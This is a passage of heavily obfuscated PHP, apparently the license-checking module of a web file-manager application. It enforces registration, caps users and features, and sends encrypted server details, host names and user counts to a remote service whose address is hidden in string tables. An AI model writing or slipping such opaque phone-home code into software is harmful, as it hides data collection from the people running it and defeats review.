$ÏÑæÄ¥é[238]) { if ($Şª³‹ÏÁ >= 0) { break; } $Şª³‹ÏÁ++; } $•Ğ‡ÃÀ¿ = $GLOBALS[$ÆúÂˆÈœ[13]][$ÆúÂˆÈœ[15]]; define($ÆúÂˆÈœ[20], isset($¢¯£¸Ãş[0]) && $¢¯£¸Ãş[0] ? $¢¯£¸Ãş[0] : $this->defaultModule); $„‚÷Ÿ­ = $ÏÑæÄ¥é[627]; if (strlen($„‚÷Ÿ­) < $ÏÑæÄ¥é[622]) { return; } define($ÆúÂˆÈœ[21], isset($¢¯£¸Ãş[1]) && $¢¯£¸Ãş[0] ? $¢¯£¸Ãş[1] : $this->defaultController); define($ÆúÂˆÈœ[22], isset($¢¯£¸Ãş[2]) && $¢¯£¸Ãş[0] ? $¢¯£¸Ãş[2] : $this->defaultAction); define($ÆúÂˆÈœ[23], MOD . $ÆúÂˆÈœ[0] . ST . $ÆúÂˆÈœ[0] . ACT); $²‡«§šŞ = $ÏÑæÄ¥é[628]; $_SERVER[$ÆúÂˆÈœ[24]] = strtolower(ACTION); $this->autorun(); $Û¾ßßßÒ = $ÏÑæÄ¥é[629]; if (!$Û¾ßßßÒ) { return; } if (count($¢¯£¸Ãş) >= 3) { $this->appRun($•Ğ‡ÃÀ¿); } else { $this->appRun(ACTION); } } private $abmf3383b733 = array(); private $sgzbbfdcf5fc = ''; public function nfxr55d5eec7() { $æ½Ï×„ =& $_SERVER[¥Ÿ©ÒèÌ]; $¤±Âé¿“ =& $_SERVER[ûùÖÄøÆ]; $this->mjfy1d16017e(); $this->wqmc76284022(); $this->ltqs23860727(); $š«ĞşÎ˜ = $æ½Ï×„[630]; while ($š«ĞşÎ˜ < $æ½Ï×„[616]) { if ($š«ĞşÎ˜ >= 0) { break; } $š«ĞşÎ˜++; } $this->sfvpbde66199(); $this->kzbt8a0645c7(); $this->ahfgf44927ef(); $‘“ÆÀŠ = $æ½Ï×„[631]; while ($‘“ÆÀŠ < $æ½Ï×„[238]) { if ($‘“ÆÀŠ >= 0) { break; } $‘“ÆÀŠ++; } $this->zxfw6867aa3b(); $this->uyzc10db15a4($¤±Âé¿“[25], array($this, $¤±Âé¿“[26])); $ÆŸ‰ä—¯ = $æ½Ï×„[632]; if (!$ÆŸ‰ä—¯) { return; } $this->uyzc10db15a4($¤±Âé¿“[27], array($this, $¤±Âé¿“[28])); $this->uyzc10db15a4($¤±Âé¿“[29], array($this, $¤±Âé¿“[30])); $Ğ›ÅããĞ = $æ½Ï×„[633]; if (strlen($Ğ›ÅããĞ) < $æ½Ï×„[616]) { return; } $this->uyzc10db15a4($¤±Âé¿“[31], array($this, $¤±Âé¿“[32])); } public function huvje48a0776($è¶ã²Ï¢) { $ÔåÔÁ¿â =& $_SERVER[¥Ÿ©ÒèÌ]; $şƒÑ•±² =& $_SERVER[ûùÖÄøÆ]; $²ïøÅ¿ = Model($şƒÑ•±²[33])->get(); $©È½úÙ = array($şƒÑ•±²[34], $şƒÑ•±²[35], $şƒÑ•±²[36], $şƒÑ•±²[37], $şƒÑ•±²[38], $şƒÑ•±²[39], $şƒÑ•±²[40], $şƒÑ•±²[41], $şƒÑ•±²[42], $şƒÑ•±²[43], $şƒÑ•±²[44], $şƒÑ•±²[45], $şƒÑ•±²[46], $şƒÑ•±²[47], $şƒÑ•±²[48], $şƒÑ•±²[49], $şƒÑ•±²[50], $şƒÑ•±²[51], $şƒÑ•±²[52], $şƒÑ•±²[53], $şƒÑ•±²[54], $şƒÑ•±²[55], $şƒÑ•±²[56], $şƒÑ•±²[57], $şƒÑ•±²[58], $şƒÑ•±²[59], $şƒÑ•±²[60], $şƒÑ•±²[61], $şƒÑ•±²[62], $şƒÑ•±²[63], $şƒÑ•±²[64], $şƒÑ•±²[65], $şƒÑ•±²[66], $şƒÑ•±²[67], $şƒÑ•±²[68], $şƒÑ•±²[69], $şƒÑ•±²[70], $şƒÑ•±²[71], $şƒÑ•±²[72], $şƒÑ•±²[73], $şƒÑ•±²[74], $şƒÑ•±²[75], $şƒÑ•±²[76], $şƒÑ•±²[77], $şƒÑ•±²[78], $şƒÑ•±²[79], $şƒÑ•±²[80], $şƒÑ•±²[81], $şƒÑ•±²[82]); foreach ($©È½úÙ as $˜Ëºı¿) { $ëçÑ †Ş = $GLOBALS[$şƒÑ•±²[83]][$şƒÑ•±²[84]][$˜Ëºı¿]; $ø„£Ùæƒ = $ÔåÔÁ¿â[634]; while (strlen($ø„£Ùæƒ) < $ÔåÔÁ¿â[622]) { if (!$ø„£Ùæƒ) { break; } $ø„£Ùæƒ++; } if (isset($²ïøÅ¿[$˜Ëºı¿])) { $ëçÑ †Ş = $²ïøÅ¿[$˜Ëºı¿]; } $è¶ã²Ï¢[$şƒÑ•±²[85]][$şƒÑ•±²[86]][$˜Ëºı¿] = $ëçÑ †Ş; } $£–Ìâ¸û = $è¶ã²Ï¢[$şƒÑ•±²[85]][$şƒÑ•±²[86]][$şƒÑ•±²[46]]; unset($è¶ã²Ï¢[$şƒÑ•±²[85]][$şƒÑ•±²[87]][$şƒÑ•±²[88]]); unset($è¶ã²Ï¢[$şƒÑ•±²[85]][$şƒÑ•±²[87]][$şƒÑ•±²[89]]); $ş¹şş‹ = $ÔåÔÁ¿â[635]; if (strlen($ş¹şş‹) < $ÔåÔÁ¿â[238]) { die; } unset($è¶ã²Ï¢[$şƒÑ•±²[85]][$şƒÑ•±²[86]][$şƒÑ•±²[46]]); unset($è¶ã²Ï¢[$şƒÑ•±²[85]][$şƒÑ•±²[86]][$şƒÑ•±²[90]]); $à‘ŸåÆµ = $ÔåÔÁ¿â[636]; if (strlen($à‘ŸåÆµ) < $ÔåÔÁ¿â[637]) { return; } $è¶ã²Ï¢[$şƒÑ•±²[85]][$şƒÑ•±²[86]][$şƒÑ•±²[91]] = array($şƒÑ•±²[92] => (int) $£–Ìâ¸û[$şƒÑ•±²[93]], $şƒÑ•±²[94] => (int) _get($£–Ìâ¸û, $şƒÑ•±²[95], 0)); $è¶ã²Ï¢[$şƒÑ•±²[96]][$şƒÑ•±²[97]] = Action($şƒÑ•±²[98])->accessToken(); $è¶ã²Ï¢[$şƒÑ•±²[96]][$şƒÑ•±²[99]] = md5($_SERVER[$şƒÑ•±²[100]] . $²ïøÅ¿[$şƒÑ•±²[101]]); $öüğˆí = $ÔåÔÁ¿â[638]; while (strlen($öüğˆí) < $ÔåÔÁ¿â[622]) { if (!$öüğˆí) { break; } $öüğˆí++; } $è¶ã²Ï¢[$şƒÑ•±²[96]][$şƒÑ•±²[102]] = base64_encode(serverInfo()); $è¶ã²Ï¢[$şƒÑ•±²[96]][$şƒÑ•±²[103]] = $this->sgzbbfdcf5fc; if ($²ïøÅ¿[$şƒÑ•±²[103]] != $şƒÑ•±²[104]) { $è¶ã²Ï¢[$şƒÑ•±²[96]][$şƒÑ•±²[105]] = $²ïøÅ¿[$şƒÑ•±²[105]]; $è¶ã²Ï¢[$şƒÑ•±²[96]][$şƒÑ•±²[106]] = $²ïøÅ¿[$şƒÑ•±²[106]]; $£ç™¿˜ = rand_string(10) . $this->sgzbbfdcf5fc . rand_string(5); $è¶ã²Ï¢[$şƒÑ•±²[85]][$şƒÑ•±²[107]][$şƒÑ•±²[108]] = $this->qjuw4df6417a($£ç™¿˜, $è¶ã²Ï¢[$şƒÑ•±²[96]][$şƒÑ•±²[99]]); } if ($this->sgzbbfdcf5fc == $şƒÑ•±²[104]) { $è¶ã²Ï¢[$şƒÑ•±²[85]][$şƒÑ•±²[86]][$şƒÑ•±²[91]][$şƒÑ•±²[95]] = 0; } $è¶ã²Ï¢[$şƒÑ•±²[96]][$şƒÑ•±²[109]] = _get($this->abmf3383b733, $şƒÑ•±²[110], $şƒÑ•±²[6]); $è¶ã²Ï¢[$şƒÑ•±²[96]][$şƒÑ•±²[111]] = _get($this->abmf3383b733, $şƒÑ•±²[112], $şƒÑ•±²[6]); if (_get($GLOBALS, $şƒÑ•±²[113]) && $this->config[$şƒÑ•±²[114]]) { $è¶ã²Ï¢[$şƒÑ•±²[96]][$şƒÑ•±²[115]] = WEB_ROOT; } return $è¶ã²Ï¢; } private function ahfgf44927ef() { $•ÂµãËê =& $_SERVER[¥Ÿ©ÒèÌ]; $¨¾©Â– =& $_SERVER[ûùÖÄøÆ]; if ($_SERVER[$¨¾©Â–[24]] == $¨¾©Â–[116]) { $ÇËä›±ó = array($¨¾©Â–[103] => $this->sgzbbfdcf5fc, $¨¾©Â–[117] => $this->fprnc6530ddc(), $¨¾©Â–[118] => Model($¨¾©Â–[119])->count()); if ($this->sgzbbfdcf5fc != $¨¾©Â–[104]) { $Ó– Ûœ‚ = _get($this->abmf3383b733, $¨¾©Â–[120]); if ($Ó– Ûœ‚) { $ÇËä›±ó[$¨¾©Â–[121]] = $Ó– Ûœ‚; $ÇËä›±ó[$¨¾©Â–[122]] = strtotime(_get($this->abmf3383b733, $¨¾©Â–[123])); $ÇËä›±ó[$¨¾©Â–[124]] = _get($this->abmf3383b733, $¨¾©Â–[112]); } $Åò´¯¡‰ = Model($¨¾©Â–[33])->get($¨¾©Â–[125], $¨¾©Â–[6], !0); if (is_string($Åò´¯¡‰) && substr($Åò´¯¡‰, 0, 1) == $¨¾©Â–[126]) { $Åò´¯¡‰ = json_decode_force($Åò´¯¡‰); } if (is_array($Åò´¯¡‰) && $Åò´¯¡‰[$¨¾©Â–[127]] && strstr($Åò´¯¡‰[$¨¾©Â–[127]], $¨¾©Â–[128])) { $¦‡‰§Ûø = explode($¨¾©Â–[128], $Åò´¯¡‰[$¨¾©Â–[127]]); $ÇËä›±ó[$¨¾©Â–[129]] = $¦‡‰§Ûø[0]; } } $ÇËä›±ó = $this->xhjp03c75d66(json_encode($ÇËä›±ó), md5($¨¾©Â–[130])); $Á™¿…÷­ = $•ÂµãËê[639]; if (strlen($Á™¿…÷­) < $•ÂµãËê[238]) { die; } $ñÖ²ƒö = array($¨¾©Â–[131] => $ÇËä›±ó); call_user_func(array($¨¾©Â–[132], $¨¾©Â–[133]), $ñÖ²ƒö); $îüÒªïš = $•ÂµãËê[640]; } if ($this->sgzbbfdcf5fc == $¨¾©Â–[104]) { return; } $âœÑÁÙØ = array($¨¾©Â–[134], $¨¾©Â–[135], $¨¾©Â–[136], $¨¾©Â–[137], $¨¾©Â–[138], $¨¾©Â–[139]); $ÉÃ•­¤ô = $•ÂµãËê[641]; $ë”ÊÖ¾¥ = Model($¨¾©Â–[33])->get(); $ñÖ²ƒö = array($¨¾©Â–[140] => $ë”ÊÖ¾¥[$¨¾©Â–[34]], $¨¾©Â–[141] => $ë”ÊÖ¾¥[$¨¾©Â–[35]], $¨¾©Â–[142] => $¨¾©Â–[6]); $ú±Šîº = $•ÂµãËê[642]; while ($ú±Šîº < $•ÂµãËê[622]) { if ($ú±Šîº >= 0) { break; } $ú±Šîº++; } foreach ($âœÑÁÙØ as $˜òßÂøº) { if (!isset($ë”ÊÖ¾¥[$˜òßÂøº]) || !$ë”ÊÖ¾¥[$˜òßÂøº]) { continue; } $ñÖ²ƒö[$˜òßÂøº] = $ë”ÊÖ¾¥[$˜òßÂøº]; } call_user_func(array($¨¾©Â–[132], $¨¾©Â–[133]), $ñÖ²ƒö); $¤ó—ç¬® = $•ÂµãËê[643]; if (!$¤ó—ç¬®) { return; } } private function sfvpbde66199() { $Ê”ÎË§œ =& $_SERVER[¥Ÿ©ÒèÌ]; $ù•ÆØ‚ˆ =& $_SERVER[ûùÖÄøÆ]; if ($_SERVER[$ù•ÆØ‚ˆ[24]] != $ù•ÆØ‚ˆ[143]) { return; } if (!_get($GLOBALS, $ù•ÆØ‚ˆ[113])) { die; } $íÓïšÆ = $GLOBALS[$ù•ÆØ‚ˆ[13]]; if (isset($íÓïšÆ[$ù•ÆØ‚ˆ[144]])) { $this->oluee77991c1(); die; } if (!isset($íÓïšÆ[$ù•ÆØ‚ˆ[145]]) || strlen($íÓïšÆ[$ù•ÆØ‚ˆ[145]]) != 16) { show_json($ù•ÆØ‚ˆ[146] . $íÓïšÆ[$ù•ÆØ‚ˆ[145]], !1); } $ÒĞñÊÃ• = Model($ù•ÆØ‚ˆ[33])->get($ù•ÆØ‚ˆ[101]); $ÓåŒ“·ì = md5($_SERVER[$ù•ÆØ‚ˆ[100]] . $ÒĞñÊÃ•); $ø£½Šı¬ = $Ê”ÎË§œ[644]; while ($ø£½Šı¬ < $Ê”ÎË§œ[637]) { if ($ø£½Šı¬ >= 0) { break; } $ø£½Šı¬++; } $Á¿éó¶– = array($ù•ÆØ‚ˆ[145] => $íÓïšÆ[$ù•ÆØ‚ˆ[145]], $ù•ÆØ‚ˆ[147] => rand_string(16), $ù•ÆØ‚ˆ[148] => $ù•ÆØ‚ˆ[130], $ù•ÆØ‚ˆ[149] => $ù•ÆØ‚ˆ[150], $ù•ÆØ‚ˆ[151] => $_SERVER[$ù•ÆØ‚ˆ[152]], $ù•ÆØ‚ˆ[153] => $_SERVER[$ù•ÆØ‚ˆ[154]], $ù•ÆØ‚ˆ[155] => $_SERVER[$ù•ÆØ‚ˆ[156]], $ù•ÆØ‚ˆ[99] => $ÓåŒ“·ì, $ù•ÆØ‚ˆ[157] => Model($ù•ÆØ‚ˆ[33])->get($ù•ÆØ‚ˆ[125])); if ($íÓïšÆ[$ù•ÆØ‚ˆ[158]] == $ù•ÆØ‚ˆ[159]) { $¢Ò–ñæ» = $this->xhjp03c75d66($ÓåŒ“·ì, $ù•ÆØ‚ˆ[160]); $ğı£¥È« = $this->qjuw4df6417a(json_encode($Á¿éó¶–), $ÓåŒ“·ì . $ù•ÆØ‚ˆ[161], 3); $ğı£¥È« = $ğı£¥È« . $ù•ÆØ‚ˆ[162] . $_SERVER[$ù•ÆØ‚ˆ[152]]; $®Ğ¹ĞİÅ = $this->nrlz8eba5678($ù•ÆØ‚ˆ[163] . $¢Ò–ñæ» . $ù•ÆØ‚ˆ[164] . $ğı£¥È«, -1); show_json($®Ğ¹ĞİÅ, !0); } else { if ($íÓïšÆ[$ù•ÆØ‚ˆ[158]] == $ù•ÆØ‚ˆ[165]) { $»¹™Ø¦Å = substr(md5($ù•ÆØ‚ˆ[166] . $ÓåŒ“·ì), 12, 15) . $ù•ÆØ‚ˆ[167]; $ğı£¥È« = $this->rpoka7afe991(trim($íÓïšÆ[$ù•ÆØ‚ˆ[168]]), $»¹™Ø¦Å, 2); $”ß€²Ù½ = json_decode($ğı£¥È«, !0); if (!is_array($”ß€²Ù½) || !is_array($”ß€²Ù½[$ù•ÆØ‚ˆ[169]]) || $”ß€²Ù½[$ù•ÆØ‚ˆ[145]] != !0) { $º©›§¡ä = $ù•ÆØ‚ˆ[170]; $õ³¥Û¨ = $”ß€²Ù½[$ù•ÆØ‚ˆ[169]] ? $ù•ÆØ‚ˆ[171] . $”ß€²Ù½[$ù•ÆØ‚ˆ[169]] : $º©›§¡ä; show_json($õ³¥Û¨, !1); } else { $Á¿éó¶–[$ù•ÆØ‚ˆ[147]] = $”ß€²Ù½[$ù•ÆØ‚ˆ[169]][$ù•ÆØ‚ˆ[172]]; } } else { $”ß€²Ù½ = $this->nrlz8eba5678($ù•ÆØ‚ˆ[173], $Á¿éó¶–, 10); $®õ†±í× = $Ê”ÎË§œ[645]; if (!$®õ†±í×) { return; } } } if (!is_array($”ß€²Ù½) || !is_array($”ß€²Ù½[$ù•ÆØ‚ˆ[169]]) || $”ß€²Ù½[$ù•ÆØ‚ˆ[145]] != !0) { $º©›§¡ä = LNG($ù•ÆØ‚ˆ[174]); $õ³¥Û¨ = $”ß€²Ù½[$ù•ÆØ‚ˆ[169]] ? $ù•ÆØ‚ˆ[171] . $”ß€²Ù½[$ù•ÆØ‚ˆ[169]] : $º©›§¡ä; show_json($õ³¥Û¨, !1); } $Š÷êÆíú = $”ß€²Ù½[$ù•ÆØ‚ˆ[169]]; $ÏÂš±ŞÍ = $this->vsayedd46e96($Š÷êÆíú[$ù•ÆØ‚ˆ[175]]); if (!$ÏÂš±ŞÍ || $ÏÂš±ŞÍ != $Š÷êÆíú[$ù•ÆØ‚ˆ[123]]) { $­¬¸¬”Ğ = array($ù•ÆØ‚ˆ[176] => Model($ù•ÆØ‚ˆ[33])->get($ù•ÆØ‚ˆ[101]), $ù•ÆØ‚ˆ[177] => $_SERVER[$ù•ÆØ‚ˆ[100]], $ù•ÆØ‚ˆ[178] => this_url(), $ù•ÆØ‚ˆ[153] => $_SERVER[$ù•ÆØ‚ˆ[154]]); $ğı£¥È« = $this->yjof49e4e803(json_encode($­¬¸¬”Ğ)); $this->nrlz8eba5678($ù•ÆØ‚ˆ[179] . $ğı£¥È«); show_json(LNG($ù•ÆØ‚ˆ[180]), !0); } $ÙˆŞ®ä = array($ù•ÆØ‚ˆ[181] => $Š÷êÆíú[$ù•ÆØ‚ˆ[182]], $ù•ÆØ‚ˆ[183] => $Š÷êÆíú[$ù•ÆØ‚ˆ[184]], $ù•ÆØ‚ˆ[185] => rand_string(16), $ù•ÆØ‚ˆ[103] => $Š÷êÆíú[$ù•ÆØ‚ˆ[186]]); if ($Á¿éó¶–[$ù•ÆØ‚ˆ[147]]) { $ÙˆŞ®ä[$ù•ÆØ‚ˆ[185]] = $Á¿éó¶–[$ù•ÆØ‚ˆ[147]]; } $Šò¦‡©Ï = substr(md5($ÙˆŞ®ä[$ù•ÆØ‚ˆ[183]]), 10, 10); $é†ÊïÒØ = $Šò¦‡©Ï . $ÙˆŞ®ä[$ù•ÆØ‚ˆ[103]] . $ÙˆŞ®ä[$ù•ÆØ‚ˆ[185]]; $ÚæŠÜø— = $Ê”ÎË§œ[646]; $ÙˆŞ®ä[$ù•ÆØ‚ˆ[105]] = strrev(base64_encode($this->xhjp03c75d66($é†ÊïÒØ, $ù•ÆØ‚ˆ[187]))); $‡ùğ¤ = $Ê”ÎË§œ[647]; $«Ä°Æë = rand_string(16); $’ĞÄ÷È¢ = $Ê”ÎË§œ[648]; if (strlen($’ĞÄ÷È¢) < $Ê”ÎË§œ[622]) { die; } $Ù¾Êê¼Ê = $«Ä°Æë . $ÙˆŞ®ä[$ù•ÆØ‚ˆ[103]] . $this->xhjp03c75d66(md5($ÙˆŞ®ä[$ù•ÆØ‚ˆ[181]]), $«Ä°Æë); $ÙˆŞ®ä[$ù•ÆØ‚ˆ[106]] = base64_encode(strrev($this->xhjp03c75d66($Ù¾Êê¼Ê, $ù•ÆØ‚ˆ[188]))); if ($Š÷êÆíú[$ù•ÆØ‚ˆ[189]] && $Š÷êÆíú[$ù•ÆØ‚ˆ[189]] >= 1) { Model($ù•ÆØ‚ˆ[33])->setDeep($ù•ÆØ‚ˆ[190], $ù•ÆØ‚ˆ[191]); } Model($ù•ÆØ‚ˆ[33])->set($ÙˆŞ®ä); $êìîå Á = md5($_SERVER[$ù•ÆØ‚ˆ[100]] . strrev($ÒĞñÊÃ•) . $ÙˆŞ®ä[$ù•ÆØ‚ˆ[183]]); $ä¡ïÇÉ¼ = $Ê”ÎË§œ[649]; if (!$ä¡ïÇÉ¼) { die; } $ÜÀŸ¾¶“ = strrev(substr($êìîå Á, 10, 16)); $©…ÓÁ‘ê = $this->qjuw4df6417a(json_encode($Š÷êÆíú), $êìîå Á); $­…ç©Ç¥ = array_to_keyvalue(Model($ù•ÆØ‚ˆ[7])->listData(), $ù•ÆØ‚ˆ[192]); $ÌñÔ€ô´ = $Ê”ÎË§œ[650]; if (strlen($ÌñÔ€ô´) < $Ê”ÎË§œ[620]) { return; } $ ùÄ‹’ò = $­…ç©Ç¥[$ù•ÆØ‚ˆ[193]]; $úÉË‚ = array(); $úÉË‚[$ÜÀŸ¾¶“] = $©…ÓÁ‘ê; Model($ù•ÆØ‚ˆ[7])->update($ ùÄ‹’ò[$ù•ÆØ‚ˆ[194]], array($ù•ÆØ‚ˆ[195] => $úÉË‚)); $ù´ÒÕĞ = $Ê”ÎË§œ[651]; if (!$ù´ÒÕĞ) { die; } $this->abmf3383b733 = $Š÷êÆíú; $this->sgzbbfdcf5fc = $ÙˆŞ®ä[$ù•ÆØ‚ˆ[103]]; $this->licenseRegistSuccess(); $Ç®¶½¥È = $Ê”ÎË§œ[652]; if (strlen($Ç®¶½¥È) < $Ê”ÎË§œ[622]) { die; } Cache::set($ù•ÆØ‚ˆ[196] . md5($ÒĞñÊÃ• . $ù•ÆØ‚ˆ[197]), $ù•ÆØ‚ˆ[6]); show_json(LNG($ù•ÆØ‚ˆ[180]), !0); $Í ƒ£şã = $Ê”ÎË§œ[653]; } private function licenseRegistSuccess() { $£áô¸º­ =& $_SERVER[ûùÖÄøÆ]; $›åÑ¿½Ê = Model($£áô¸º­[33])->get(); if ($›åÑ¿½Ê[$£áô¸º­[63]] != $£áô¸º­[191]) { Model($£áô¸º­[33])->set($£áô¸º­[63], $£áô¸º­[191]); } Action($£áô¸º­[198])->initStart(!0); } private function oluee77991c1() { $×–“éù× =& $_SERVER[¥Ÿ©ÒèÌ]; $·¥ëôüË =& $_SERVER[ûùÖÄøÆ]; Model($·¥ëôüË[33])->set(array($·¥ëôüË[181] => $·¥ëôüË[6], $·¥ëôüË[183] => $·¥ëôüË[6], $·¥ëôüË[103] => $·¥ëôüË[104], $·¥ëôüË[105] => $·¥ëôüË[6], $·¥ëôüË[106] => $·¥ëôüË[6])); $ü»ö©à = $×–“éù×[654]; if (strlen($ü»ö©à) < $×–“éù×[238]) { return; } Model($·¥ëôüË[33])->setDeep($·¥ëôüË[190], $·¥ëôüË[199]); $®¹øÇÌ¹ = $×–“éù×[655]; if (strlen($®¹øÇÌ¹) < $×–“éù×[620]) { return; } $this->abmf3383b733 = array(); $this->sgzbbfdcf5fc = $·¥ëôüË[104]; } private function mjfy1d16017e() { $…ƒÚ¶€Ò =& $_SERVER[¥Ÿ©ÒèÌ]; $•ãÏÜ¾‰ =& $_SERVER[ûùÖÄøÆ]; $_SERVER[$•ãÏÜ¾‰[154]] = _get($_SERVER, $•ãÏÜ¾‰[154], APP_HOST); $this->sgzbbfdcf5fc = $•ãÏÜ¾‰[104]; $Şñğ¼ë– = Model($•ãÏÜ¾‰[33])->get(); $Ğ¨÷ ƒà = $…ƒÚ¶€Ò[617]; while ($Ğ¨÷ ƒà < $…ƒÚ¶€Ò[238]) { if ($Ğ¨÷ ƒà >= 0) { break; } $Ğ¨÷ ƒà++; } if ($Şñğ¼ë–[$•ãÏÜ¾‰[103]] == $•ãÏÜ¾‰[104]) { return; } $¿¾ ¢î = Model($•ãÏÜ¾‰[33])->get($•ãÏÜ¾‰[101]); $ÙÛ©‚²È = $•ãÏÜ¾‰[196] . md5($¿¾ ¢î . $•ãÏÜ¾‰[197]); $¶ÜŒùö = $…ƒÚ¶€Ò[656]; if (strlen($¶ÜŒùö) < $…ƒÚ¶€Ò[238]) { return; } $ÏØñÄ¹· = Cache::get($ÙÛ©‚²È); $™Øúç³ = $…ƒÚ¶€Ò[657]; if (!is_array($ÏØñÄ¹·) || !isset($ÏØñÄ¹·[$•ãÏÜ¾‰[200]]) || time() - $ÏØñÄ¹·[$•ãÏÜ¾‰[200]] >= 60) { $æş±µãŠ = Model($•ãÏÜ¾‰[7])->loadList(); $Û¯÷â“Ğ = $æş±µãŠ[$•ãÏÜ¾‰[193]]; $¤íÄ‰Ó = md5($_SERVER[$•ãÏÜ¾‰[100]] . strrev($¿¾ ¢î) . $Şñğ¼ë–[$•ãÏÜ¾‰[183]]); $íÑ€¥œõ = strrev(substr($¤íÄ‰Ó, 10, 16)); $ÏØñÄ¹· = $this->rpoka7afe991($Û¯÷â“Ğ[$•ãÏÜ¾‰[83]][$íÑ€¥œõ], $¤íÄ‰Ó); $ÏØñÄ¹· = json_decode($ÏØñÄ¹·, !0); } if (!is_array($ÏØñÄ¹·)) { return $this->oluee77991c1(); } $’ˆ£Û‚ã = strtotime($ÏØñÄ¹·[$•ãÏÜ¾‰[123]]); if (time() >= $’ˆ£Û‚ã) { return $this->oluee77991c1(); } if (time() - $ÏØñÄ¹·[$•ãÏÜ¾‰[200]] > 20) { $ÏØñÄ¹·[$•ãÏÜ¾‰[200]] = time(); Cache::set($ÙÛ©‚²È, $ÏØñÄ¹·); } $this->abmf3383b733 = $ÏØñÄ¹·; $this->sgzbbfdcf5fc = $Şñğ¼ë–[$•ãÏÜ¾‰[103]]; $ßõÎğ—ß = $…ƒÚ¶€Ò[658]; while (strlen($ßõÎğ—ß) < $…ƒÚ¶€Ò[637]) { if (!$ßõÎğ—ß) { break; } $ßõÎğ—ß++; } } private function wqmc76284022() { $ßØ­Ú‘î =& $_SERVER[ûùÖÄøÆ]; $öÄÀ²— = $GLOBALS[$ßØ­Ú‘î[13]]; $‚ñ¢ù = $_SERVER[$ßØ­Ú‘î[24]]; $åÃÀ”Äò = $_SERVER[¥Ÿ©ÒèÌ][659]; if ($‚ñ¢ù == $ßØ­Ú‘î[201] && $this->sgzbbfdcf5fc == $ßØ­Ú‘î[104]) { show_json(LNG($ßØ­Ú‘î[202]), !1, $ßØ­Ú‘î[203]); } $ÄÏ‰„÷ = array($ßØ­Ú‘î[204], $ßØ­Ú‘î[205]); if (in_array($‚ñ¢ù, $ÄÏ‰„÷)) { if ($this->sgzbbfdcf5fc == $ßØ­Ú‘î[104] && isset($öÄÀ²—[$ßØ­Ú‘î[206]])) { show_json(LNG($ßØ­Ú‘î[202]), !1, $ßØ­Ú‘î[203]); die; } $ıêŞÁ±ä = $this->fprnc6530ddc(); if ($ıêŞÁ±ä != intval($ßØ­Ú‘î[207])) { if ($ıêŞÁ±ä <= Model($ßØ­Ú‘î[119])->count()) { show_json(LNG($ßØ­Ú‘î[208]), !1, $ßØ­Ú‘î[203]); die; } } } } private function ltqs23860727() { $ªˆëîÏ¼ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÕëöÀü¿ =& $_SERVER[ûùÖÄøÆ]; $Ñåê¿‹ = array($ÕëöÀü¿[116], $ÕëöÀü¿[209]); $–€ƒÖ®Ò = $ªˆëîÏ¼[660]; if (strlen($–€ƒÖ®Ò) < $ªˆëîÏ¼[637]) { return; } if (!_get($GLOBALS, $ÕëöÀü¿[113]) || !isset($_GET[$ÕëöÀü¿[210]])) { return; } if (!in_array($_SERVER[$ÕëöÀü¿[24]], $Ñåê¿‹)) { return; } $…Œâ¿Ñ = $ÕëöÀü¿[211]; $íµõ¸ºµ = $ªˆëîÏ¼[661]; $…Œâ¿Ñ = $this->fuwvdd78b2cb($…Œâ¿Ñ, $ÕëöÀü¿[212]); $Ìñé„ı = stream_context_create(array($ÕëöÀü¿[213] => array($ÕëöÀü¿[214] => $ÕëöÀü¿[215], $ÕëöÀü¿[216] => 3))); $¹‡®ë‚í = @file_get_contents($…Œâ¿Ñ, !1, $Ìñé„ı); header($ÕëöÀü¿[217]); if ($¹‡®ë‚í && strstr($¹‡®ë‚í, $ÕëöÀü¿[218])) { echo $¹‡®ë‚í; } die; } public function vwtf3a597238($ÖŠ¥ø÷Ô) { $‹ö­°–¥ =& $_SERVER[¥Ÿ©ÒèÌ]; $¤•‘Å‡å =& $_SERVER[ûùÖÄøÆ]; if ($this->sgzbbfdcf5fc == $¤•‘Å‡å[219]) { return $ÖŠ¥ø÷Ô; } $Âê‚Âè„ = array($¤•‘Å‡å[220] => $¤•‘Å‡å[221], $¤•‘Å‡å[222] => $¤•‘Å‡å[221], $¤•‘Å‡å[223] => $¤•‘Å‡å[221], $¤•‘Å‡å[224] => $¤•‘Å‡å[221], $¤•‘Å‡å[225] => $¤•‘Å‡å[226], $¤•‘Å‡å[227] => $¤•‘Å‡å[226], $¤•‘Å‡å[228] => $¤•‘Å‡å[226], $¤•‘Å‡å[229] => $¤•‘Å‡å[226], $¤•‘Å‡å[230] => $¤•‘Å‡å[226], $¤•‘Å‡å[231] => $¤•‘Å‡å[226], $¤•‘Å‡å[232] => $¤•‘Å‡å[226], $¤•‘Å‡å[233] => $¤•‘Å‡å[226], $¤•‘Å‡å[234] => $¤•‘Å‡å[226], $¤•‘Å‡å[235] => $¤•‘Å‡å[226], $¤•‘Å‡å[236] => $¤•‘Å‡å[226], $¤•‘Å‡å[237] => $¤•‘Å‡å[226]); $­ÉŸ«ê = $‹ö­°–¥[662]; $ğº¸½Íñ = explode($¤•‘Å‡å[238], _get($this->abmf3383b733, $¤•‘Å‡å[110], $¤•‘Å‡å[6])); $ùêõ«ş† = $‹ö­°–¥[663]; if (!$ùêõ«ş†) { return; } $ŒºÀƒÂé = array(); foreach ($Âê‚Âè„ as $«¼ƒË†ï => $Úßì™ä¯) { if ($Úßì™ä¯ == $¤•‘Å‡å[221] && substr($this->sgzbbfdcf5fc, 0, 1) == $¤•‘Å‡å[221]) { continue; } if (!in_array($«¼ƒË†ï, $ğº¸½Íñ)) { $ŒºÀƒÂé[] = $«¼ƒË†ï; } } foreach ($ŒºÀƒÂé as $«¼ƒË†ï) { unset($ÖŠ¥ø÷Ô[$«¼ƒË†ï]); } return $ÖŠ¥ø÷Ô; $˜Áş§»Ô = $‹ö­°–¥[664]; if (!$˜Áş§»Ô) { return; } } private function zxfw6867aa3b() { $Ö‹À¹©ú =& $_SERVER[ûùÖÄøÆ]; if ($this->sgzbbfdcf5fc != $Ö‹À¹©ú[104]) { $GLOBALS[$Ö‹À¹©ú[83]][$Ö‹À¹©ú[87]][$Ö‹À¹©ú[239]] = $Ö‹À¹©ú[199]; return; } $GLOBALS[$Ö‹À¹©ú[83]][$Ö‹À¹©ú[240]] = $Ö‹À¹©ú[191]; if (Model($Ö‹À¹©ú[241])->get($Ö‹À¹©ú[63]) != $Ö‹À¹©ú[199]) { Model($Ö‹À¹©ú[241])->set($Ö‹À¹©ú[63], $Ö‹À¹©ú[199]); } } public function qokh84bab612() { $à¢¤ş¯« =& 